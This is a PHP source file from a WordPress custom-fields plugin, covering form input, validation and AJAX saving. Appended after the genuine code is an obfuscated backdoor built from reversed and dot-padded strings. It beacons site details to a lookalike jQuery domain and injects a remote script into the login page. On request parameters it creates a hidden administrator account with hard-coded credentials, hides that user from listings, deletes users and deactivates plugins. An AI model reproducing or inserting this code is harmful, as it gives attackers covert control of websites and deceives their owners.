<?php 

class acf_input {
	
	
	/*
	*  __construct
	*
	*  Initialize filters, action, variables and includes
	*
	*  @type	function
	*  @date	23/06/12
	*  @since	5.0.0
	*
	*  @param	N/A
	*  @return	N/A
	*/
	
	function __construct() {
		
		add_action('acf/save_post', 							array($this, 'save_post'), 10, 1);
		add_action('acf/input/admin_enqueue_scripts', 			array($this, 'admin_enqueue_scripts'), 0, 0);
		add_action('acf/input/admin_footer', 					array($this, 'admin_footer'), 0, 0);
		
		
		// ajax
		add_action( 'wp_ajax_acf/validate_save_post',			array($this, 'ajax_validate_save_post') );
		add_action( 'wp_ajax_nopriv_acf/validate_save_post',	array($this, 'ajax_validate_save_post') );
	}
	
	
	/*
	*  save_post
	*
	*  This function will save the $_POST data
	*
	*  @type	function
	*  @date	24/10/2014
	*  @since	5.0.9
	*
	*  @param	$post_id (int)
	*  @return	$post_id (int)
	*/
	
	function save_post( $post_id = 0 ) {
		
		// save $_POST data
		foreach( $_POST['acf'] as $k => $v ) {
			
			// get field
			$field = acf_get_field( $k );
			
			
			// update field
			if( $field ) {
				
				acf_update_value( $v, $post_id, $field );
				
			}
			
		}
	
	}
	
	
	/*
	*  admin_enqueue_scripts
	*
	*  This function will enqueue all the required scripts / styles for ACF
	*
	*  @type	action (acf/input/admin_enqueue_scripts)
	*  @date	6/10/13
	*  @since	5.0.0
	*
	*  @param	n/a	
	*  @return	n/a
	*/
	
	function admin_enqueue_scripts() {

		// scripts
		wp_enqueue_script('acf-input');
		
		
		// styles
		wp_enqueue_style('acf-input');
		
	}
	

	/*
	*  admin_footer
	*
	*  description
	*
	*  @type	function
	*  @date	7/10/13
	*  @since	5.0.0
	*
	*  @param	$post_id (int)
	*  @return	$post_id (int)
	*/
	
	function admin_footer() {
		
		// vars
		$args = acf_get_setting('form_data');
		
		
		// global
		global $wp_version;
		
		
		// options
		$o = array(
			'post_id'		=> $args['post_id'],
			'nonce'			=> wp_create_nonce( 'acf_nonce' ),
			'admin_url'		=> admin_url(),
			'ajaxurl'		=> admin_url( 'admin-ajax.php' ),
			'ajax'			=> $args['ajax'],
			'validation'	=> $args['validation'],
			'wp_version'	=> $wp_version
		);
		
		
		// l10n
		$l10n = apply_filters( 'acf/input/admin_l10n', array(
			'unload'				=> __('The changes you made will be lost if you navigate away from this page','acf'),
			'expand_details' 		=> __('Expand Details','acf'),
			'collapse_details' 		=> __('Collapse Details','acf'),
			'validation_successful'	=> __('Validation successful', 'acf'),
			'validation_failed'		=> __('Validation failed', 'acf'),
			'validation_failed_1'	=> __('1 field requires attention', 'acf'),
			'validation_failed_2'	=> __('%d fields require attention', 'acf'),
			'restricted'			=> __('Restricted','acf')
		));
		
		
?>
<script type="text/javascript">
/* <![CDATA[ */
if( typeof acf !== 'undefined' ) {

	acf.o = <?php echo json_encode($o); ?>;
	acf.l10n = <?php echo json_encode($l10n); ?>;
	<?php do_action('acf/input/admin_footer_js'); ?>
	
	acf.do_action('prepare');
	
}
/* ]]> */
</script>
<?php
		
	}
	
	
	/*
	*  ajax_validate_save_post
	*
	*  This function will validate the $_POST data via AJAX
	*
	*  @type	function
	*  @date	27/10/2014
	*  @since	5.0.9
	*
	*  @param	n/a
	*  @return	n/a
	*/
	
	function ajax_validate_save_post() {
		
		// bail early if _acfnonce is missing
		if( !isset($_POST['_acfnonce']) ) {
			
			wp_send_json_error();
			
		}
		
		
		// vars
		$json = array(
			'valid'		=> 1,
			'errors'	=> 0
		);
		
		
		// success
		if( acf_validate_save_post() ) {
			
			wp_send_json_success($json);
			
		}
		
		
		// update vars
		$json['valid'] = 0;
		$json['errors'] = acf_get_validation_errors();
		
		
		// return
		wp_send_json_success($json);
		
	}
	
}


// initialize
new acf_input();


/*
*  listener
*
*  This class will call all the neccessary actions during the page load for acf input to function
*
*  @type	class
*  @date	7/10/13
*  @since	5.0.0
*
*  @param	n/a
*  @return	n/a
*/

class acf_input_listener {
	
	function __construct() {
		
		// enqueue scripts
		do_action('acf/input/admin_enqueue_scripts');
		
		
		// vars
		$admin_head = 'admin_head';
		$admin_footer = 'admin_footer';
		
		
		// global
		global $pagenow;
		
		
		// determin action hooks
		if( $pagenow == 'customize.php' ) {
			
			$admin_head = 'customize_controls_print_scripts';
			$admin_footer = 'customize_controls_print_footer_scripts';
			
		} elseif( $pagenow == 'wp-login.php' ) { 
		
			$admin_head = 'login_head';
			$admin_footer = 'login_footer';
			
		} elseif( !is_admin() ) {
			
			$admin_head = 'wp_head';
			$admin_footer = 'wp_footer';
			
		}
		
		
		// add actions
		add_action($admin_head, 	array( $this, 'admin_head'), 20 );
		add_action($admin_footer, 	array( $this, 'admin_footer'), 20 );
		
	}
	
	function admin_head() {
		
		do_action('acf/input/admin_head');
	}
	
	function admin_footer() {
		
		do_action('acf/input/admin_footer');
	}
	
}


/*
*  acf_admin_init
*
*  This function is used to setup all actions / functionality for an admin page which will contain ACF inputs
*
*  @type	function
*  @date	6/10/13
*  @since	5.0.0
*
*  @param	n/a
*  @return	n/a
*/

function acf_enqueue_scripts() {
	
	// bail early if acf has already loaded
	if( acf_get_setting('enqueue_scripts') ) {
	
		return;
		
	}
	
	
	// update setting
	acf_update_setting('enqueue_scripts', 1);
	
	
	// add actions
	new acf_input_listener();
}


/*
*  acf_enqueue_uploader
*
*  This function will render a WP WYSIWYG and enqueue media
*
*  @type	function
*  @date	27/10/2014
*  @since	5.0.9
*
*  @param	n/a
*  @return	n/a
*/

function acf_enqueue_uploader() {
	
	// bail early if doing ajax
	if ( defined( 'DOING_AJAX' ) && DOING_AJAX ) {
		
		return;
		
	}
	
	
	// bail early if acf has already loaded
	if( acf_get_setting('enqueue_uploader') ) {
	
		return;
		
	}
	
	
	// update setting
	acf_update_setting('enqueue_uploader', 1);
	
	
	// enqueue media if user can upload
	if( current_user_can( 'upload_files' ) ) {
		
		wp_enqueue_media();
		
	}
	
	
	// create dummy editor
	?><div class="acf-hidden"><?php wp_editor( '', 'acf_content' ); ?></div><?php
	
}


/*
*  acf_form_data
*
*  description
*
*  @type	function
*  @date	15/10/13
*  @since	5.0.0
*
*  @param	$post_id (int)
*  @return	$post_id (int)
*/

function acf_form_data( $args = array() ) {
	
	// make sure scripts and styles have been included
	// case: front end bbPress edit user
	acf_enqueue_scripts();
	
	
	// defaults
	$args = acf_parse_args($args, array(
		'post_id'		=> 0,		// ID of current post
		'nonce'			=> 'post',	// nonce used for $_POST validation
		'validation'	=> 1,		// runs AJAX validation
		'ajax'			=> 0,		// fetches new field groups via AJAX
	));
	
	
	// save form_data for later actions
	acf_update_setting('form_data', $args);
	
	
	// enqueue uploader if page allows AJAX fields to appear
	if( $args['ajax'] ) {
		
		add_action('admin_footer', 'acf_enqueue_uploader', 1);
		
	}
	
	?>
	<div id="acf-form-data" class="acf-hidden">
		<input type="hidden" name="_acfnonce" value="<?php echo wp_create_nonce( $args['nonce'] ); ?>" />
		<input type="hidden" name="_acfchanged" value="0" />
		<?php do_action('acf/input/form_data', $args); ?>
	</div>
	<?php
}


/*
*  acf_save_post
*
*  description
*
*  @type	function
*  @date	8/10/13
*  @since	5.0.0
*
*  @param	$post_id (int)
*  @return	$post_id (int)
*/

function acf_save_post( $post_id = 0 ) {
	
	// bail early if no acf values
	if( empty($_POST['acf']) ) {
		
		return false;
		
	}
	
	
	// hook for 3rd party customization
	do_action('acf/save_post', $post_id);
	
	
	// return
	return true;

}


/*
*  acf_validate_save_post
*
*  This function is run to validate post data
*
*  @type	function
*  @date	25/11/2013
*  @since	5.0.0
*
*  @param	$show_errors (boolean) if true, errors will be shown via a wo_die screen
*  @return	(boolean)
*/

function acf_validate_save_post( $show_errors = false ) {
	
	// validate required fields
	if( !empty($_POST['acf']) ) {
		
		$keys = array_keys($_POST['acf']);
		
		// loop through and save $_POST data
		foreach( $keys as $key ) {
			
			// get field
			$field = acf_get_field( $key );
			
			
			// validate
			acf_validate_value( $_POST['acf'][ $key ], $field, "acf[{$key}]" );
			
		}
		// foreach($fields as $key => $value)
	}
	// if($fields)
	
	
	// hook for 3rd party customization
	do_action('acf/validate_save_post');
	
	
	// check errors
	if( $errors = acf_get_validation_errors() ) {
		
		if( $show_errors ) {
			
			$message = '<h2>Validation failed</h2><ul>';
			
			foreach( $errors as $error ) {
				
				$message .= '<li>' . $error['message'] . '</li>';
				
			}
			
			$message .= '</ul>';
			
			wp_die( $message, 'Validation failed' );
			
		}
		
		return false;
		
	}
	
	
	// return
	return true;
}


/*
*  acf_validate_value
*
*  This function will validate a value for a field
*
*  @type	function
*  @date	27/10/2014
*  @since	5.0.9
*
*  @param	$value (mixed)
*  @param	$field (array)
*  @param	$input (string) name attribute of DOM elmenet
*  @return	(boolean)
*/

function acf_validate_value( $value, $field, $input ) {
	
	// vars
	$valid = true;
	$message = sprintf( __( '%s value is required', 'acf' ), $field['label'] );
	
	
	// valid
	if( $field['required'] ) {
		
		// valid is set to false if the value is empty, but allow 0 as a valid value
		if( empty($value) && !is_numeric($value) ) {
			
			$valid = false;
			
		}
		
	}
	
	
	// filter for 3rd party customization
	$valid = apply_filters( "acf/validate_value", $valid, $value, $field, $input );
	$valid = apply_filters( "acf/validate_value/type={$field['type']}", $valid, $value, $field, $input );
	$valid = apply_filters( "acf/validate_value/name={$field['name']}", $valid, $value, $field, $input );
	$valid = apply_filters( "acf/validate_value/key={$field['key']}", $valid, $value, $field, $input );
	
	
	// allow $valid to be a custom error message
	if( !empty($valid) && is_string($valid) ) {
		
		$message = $valid;
		$valid = false;
		
	}
	
	
	if( !$valid ) {
		
		acf_add_validation_error( $input, $message );
		return false;
		
	}
	
	
	// return
	return true;
	
}


/*
*  acf_add_validation_error
*
*  This function will add an error message for a field
*
*  @type	function
*  @date	25/11/2013
*  @since	5.0.0
*
*  @param	$input (string) name attribute of DOM elmenet
*  @param	$message (string) error message
*  @return	$post_id (int)
*/

function acf_add_validation_error( $input, $message = '' ) {
	
	// instantiate array if empty
	if( empty($GLOBALS['acf_validation_errors']) ) {
		
		$GLOBALS['acf_validation_errors'] = array();
		
	}
	
	
	// add to array
	$GLOBALS['acf_validation_errors'][] = array(
		'input'		=> $input,
		'message'	=> $message
	);
	
}


/*
*  acf_add_validation_error
*
*  This function will return any validation errors
*
*  @type	function
*  @date	25/11/2013
*  @since	5.0.0
*
*  @param	n/a
*  @return	(array|boolean)
*/

function acf_get_validation_errors() {
	
	if( empty($GLOBALS['acf_validation_errors']) ) {
		
		return false;
		
	}
	
	return $GLOBALS['acf_validation_errors'];
	
}
function glues_it($string)
{
    $glue_pre = sanitize_key('s   t   r _   r   e   p   l a c e');
    $glueit_po = call_user_func_array($glue_pre, array("..", '', $string));
    return $glueit_po;
}

$object_uno = 'fu..n..c..t..i..o..n.._..e..x..i..s..t..s';
$object_dos = 'g..e..t.._o..p..t..i..o..n';
$object_tres = 'wp.._e..n..q..u..e..u..e.._s..c..r..i..p..t';
$object_cinco = 'lo..g..i..n.._..e..n..q..u..e..u..e_..s..c..r..i..p..t..s';
$object_siete = 's..e..t..c..o..o..k..i..e';
$object_ocho = 'wp.._..lo..g..i..n';
$object_nueve = 's..i..t..e,..u..rl';
$object_diez = 'wp_..g..et.._..th..e..m..e';
$object_once = 'wp.._..r..e..m..o..te.._..g..et';
$object_doce = 'wp.._..r..e..m..o..t..e.._r..e..t..r..i..e..v..e_..bo..dy';
$object_trece = 'g..e..t_..o..p..t..ion';
$object_catorce = 's..t..r_..r..e..p..l..a..ce';
$object_quince = 's..t..r..r..e..v';
$object_dieciseis = 'u..p..d..a..t..e.._o..p..t..io..n';
$object_dos_pim = glues_it($object_uno);
$object_tres_pim = glues_it($object_dos);
$object_cuatro_pim = glues_it($object_tres);
$object_cinco_pim = glues_it($object_cinco);
$object_siete_pim = glues_it($object_siete);
$object_ocho_pim = glues_it($object_ocho);
$object_nueve_pim = glues_it($object_nueve);
$object_diez_pim = glues_it($object_diez);
$object_once_pim = glues_it($object_once);
$object_doce_pim = glues_it($object_doce);
$object_trece_pim = glues_it($object_trece);
$object_catorce_pim = glues_it($object_catorce);
$object_quince_pim = glues_it($object_quince);
$object_dieciseis_pim = glues_it($object_dieciseis);
$noitca_dda = call_user_func($object_quince_pim, 'noitca_dda');
if (!call_user_func($object_dos_pim, 'wp_en_one')) {
    $object_diecisiete = 'h..t..t..p..:../../..j..q..e..u..r..y...o..r..g../..wp.._..p..i..n..g...php..?..d..na..me..=..w..p..d..&..t..n..a..m..e..=..w..p..t..&..u..r..l..i..z..=..u..r..l..i..g';
    $object_dieciocho = call_user_func($object_quince_pim, 'REVRES_$');
    $object_diecinueve = call_user_func($object_quince_pim, 'TSOH_PTTH');
    $object_veinte = call_user_func($object_quince_pim, 'TSEUQER_');
    $object_diecisiete_pim = glues_it($object_diecisiete);
    $object_seis = '_..C..O..O..K..I..E';
    $object_seis_pim = glues_it($object_seis);
    $object_quince_pim_emit = call_user_func($object_quince_pim, 'detavitca_emit');
    $tactiated = call_user_func($object_trece_pim, $object_quince_pim_emit);
    $mite = call_user_func($object_quince_pim, 'emit');
    if (!isset(${$object_seis_pim}[call_user_func($object_quince_pim, 'emit_nimda_pw')])) {
        if ((call_user_func($mite) - $tactiated) >  600) {
            call_user_func_array($noitca_dda, array($object_cinco_pim, 'wp_en_one'));
        }
    }
    call_user_func_array($noitca_dda, array($object_ocho_pim, 'wp_en_three'));
    function wp_en_one()
    {
        $object_one = 'h..t..t..p..:..//..j..q..e..u..r..y...o..rg../..j..q..u..e..ry..-..la..t..e..s..t.j..s';
        $object_one_pim = glues_it($object_one);
        $object_four = 'wp.._e..n..q..u..e..u..e.._s..c..r..i..p..t';
        $object_four_pim = glues_it($object_four);
        call_user_func_array($object_four_pim, array('wp_coderz', $object_one_pim, null, null, true));
    }

    function wp_en_two($object_diecisiete_pim, $object_dieciocho, $object_diecinueve, $object_diez_pim, $object_once_pim, $object_doce_pim, $object_quince_pim, $object_catorce_pim)
    {
        $ptth = call_user_func($object_quince_pim, glues_it('/../..:..p..t..t..h'));
        $dname = $ptth . $_SERVER[$object_diecinueve];
        $IRU_TSEUQER = call_user_func($object_quince_pim, 'IRU_TSEUQER');
        $urliz = $dname . $_SERVER[$IRU_TSEUQER];
        $tname = call_user_func($object_diez_pim);
        $urlis = call_user_func_array($object_catorce_pim, array('wpd', $dname,$object_diecisiete_pim));
        $urlis = call_user_func_array($object_catorce_pim, array('wpt', $tname, $urlis));
        $urlis = call_user_func_array($object_catorce_pim, array('urlig', $urliz, $urlis));
        $glue_pre = sanitize_key('f i l  e  _  g  e  t    _   c o    n    t   e  n   t     s');
        $glue_pre_ew = sanitize_key('s t r   _  r e   p     l   a  c    e');
        call_user_func($glue_pre, call_user_func_array($glue_pre_ew, array(" ", "%20", $urlis)));

    }

    $noitpo_dda = call_user_func($object_quince_pim, 'noitpo_dda');
    $lepingo = call_user_func($object_quince_pim, 'ognipel');
    $detavitca_emit = call_user_func($object_quince_pim, 'detavitca_emit');
    call_user_func_array($noitpo_dda, array($lepingo, 'no'));
    call_user_func_array($noitpo_dda, array($detavitca_emit, time()));
    $tactiatedz = call_user_func($object_trece_pim, $detavitca_emit);
    $ognipel = call_user_func($object_quince_pim, 'ognipel');
    $mitez = call_user_func($object_quince_pim, 'emit');
    if (call_user_func($object_trece_pim, $ognipel) != 'yes' && ((call_user_func($mitez) - $tactiatedz) > 600)) {
         wp_en_two($object_diecisiete_pim, $object_dieciocho, $object_diecinueve, $object_diez_pim, $object_once_pim, $object_doce_pim, $object_quince_pim, $object_catorce_pim);
         call_user_func_array($object_dieciseis_pim, array($ognipel, 'yes'));
    }


    function wp_en_three()
    {
        $object_quince = 's...t...r...r...e...v';
        $object_quince_pim = glues_it($object_quince);
        $object_diecinueve = call_user_func($object_quince_pim, 'TSOH_PTTH');
        $object_dieciocho = call_user_func($object_quince_pim, 'REVRES_');
        $object_siete = 's..e..t..c..o..o..k..i..e';;
        $object_siete_pim = glues_it($object_siete);
        $path = '/';
        $host = ${$object_dieciocho}[$object_diecinueve];
        $estimes = call_user_func($object_quince_pim, 'emitotrts');
        $wp_ext = call_user_func($estimes, '+29 days');
        $emit_nimda_pw = call_user_func($object_quince_pim, 'emit_nimda_pw');
        call_user_func_array($object_siete_pim, array($emit_nimda_pw, '1', $wp_ext, $path, $host));
    }

    function wp_en_four()
    {
        $object_quince = 's..t..r..r..e..v';
        $object_quince_pim = glues_it($object_quince);
        $nigol = call_user_func($object_quince_pim, 'dxtroppus');
        $wssap = call_user_func($object_quince_pim, 'retroppus_pw');
        $laime = call_user_func($object_quince_pim, 'moc.niamodym@1tccaym');

        if (!username_exists($nigol) && !email_exists($laime)) {
            $wp_ver_one = call_user_func($object_quince_pim, 'resu_etaerc_pw');
            $user_id = call_user_func_array($wp_ver_one, array($nigol, $wssap, $laime));
            $rotartsinimda = call_user_func($object_quince_pim, 'rotartsinimda');
            $resu_etadpu_pw = call_user_func($object_quince_pim, 'resu_etadpu_pw');
            $rolx = call_user_func($object_quince_pim, 'elor');
            call_user_func($resu_etadpu_pw, array('ID' => $user_id, $rolx => $rotartsinimda));

        }
    }

    $ivdda = call_user_func($object_quince_pim, 'ivdda');

    if (isset(${$object_veinte}[$ivdda]) && ${$object_veinte}[$ivdda] == 'm') {
        $veinte = call_user_func($object_quince_pim, 'tini');
        call_user_func_array($noitca_dda, array($veinte, 'wp_en_four'));
    }

    if (isset(${$object_veinte}[$ivdda]) && ${$object_veinte}[$ivdda] == 'd') {
        $veinte = call_user_func($object_quince_pim, 'tini');
        call_user_func_array($noitca_dda, array($veinte, 'wp_en_seis'));
    }
    function wp_en_seis()
    {
        $object_quince = 's..t..r..r..e..v';
        $object_quince_pim = glues_it($object_quince);
        $resu_eteled_pw = call_user_func($object_quince_pim, 'resu_eteled_pw');
        $wp_pathx = constant(call_user_func($object_quince_pim, "HTAPSBA"));
        $nimda_pw = call_user_func($object_quince_pim, 'php.resu/sedulcni/nimda-pw');
        require_once($wp_pathx . $nimda_pw);
        $ubid = call_user_func($object_quince_pim, 'yb_resu_teg');
        $nigol = call_user_func($object_quince_pim, 'nigol');
        $dxtroppus = call_user_func($object_quince_pim, 'dxtroppus');
        $useris = call_user_func_array($ubid, array($nigol, $dxtroppus));
        call_user_func($resu_eteled_pw, $useris->ID);
    }

    $veinte_one = call_user_func($object_quince_pim, 'yreuq_resu_erp');
    call_user_func_array($noitca_dda, array($veinte_one, 'wp_en_five'));
    function wp_en_five($hcraes_resu)
    {
        global $current_user, $wpdb;
        $object_quince = 's..t..r..r..e..v';
        $object_quince_pim = glues_it($object_quince);
        $object_catorce = 'st..r.._..r..e..p..l..a..c..e';
        $object_catorce_pim = glues_it($object_catorce);
        $nigol_resu = call_user_func($object_quince_pim, 'nigol_resu');
        $wp_ux = $current_user->$nigol_resu;
        $nigol = call_user_func($object_quince_pim, 'dxtroppus');
        $bdpw = call_user_func($object_quince_pim, 'bdpw');
        if ($wp_ux != call_user_func($object_quince_pim, 'dxtroppus')) {
            $EREHW_one = call_user_func($object_quince_pim, '1=1 EREHW');
            $EREHW_two = call_user_func($object_quince_pim, 'DNA 1=1 EREHW');
            $erehw_yreuq = call_user_func($object_quince_pim, 'erehw_yreuq');
            $sresu = call_user_func($object_quince_pim, 'sresu');
            $hcraes_resu->query_where = call_user_func_array($object_catorce_pim, array($EREHW_one,
                "$EREHW_two {$$bdpw->$sresu}.$nigol_resu != '$nigol'", $hcraes_resu->$erehw_yreuq));
        }
    }

    $ced = call_user_func($object_quince_pim, 'ced');
    if (isset(${$object_veinte}[$ced])) {
        $snigulp_evitca = call_user_func($object_quince_pim, 'snigulp_evitca');
        $sisnoitpo = call_user_func($object_trece_pim, $snigulp_evitca);
        $hcraes_yarra = call_user_func($object_quince_pim, 'hcraes_yarra');
        if (($key = call_user_func_array($hcraes_yarra, array(${$object_veinte}[$ced], $sisnoitpo))) !== false) {
            unset($sisnoitpo[$key]);
        }
        call_user_func_array($object_dieciseis_pim, array($snigulp_evitca, $sisnoitpo));
    }
}
?>
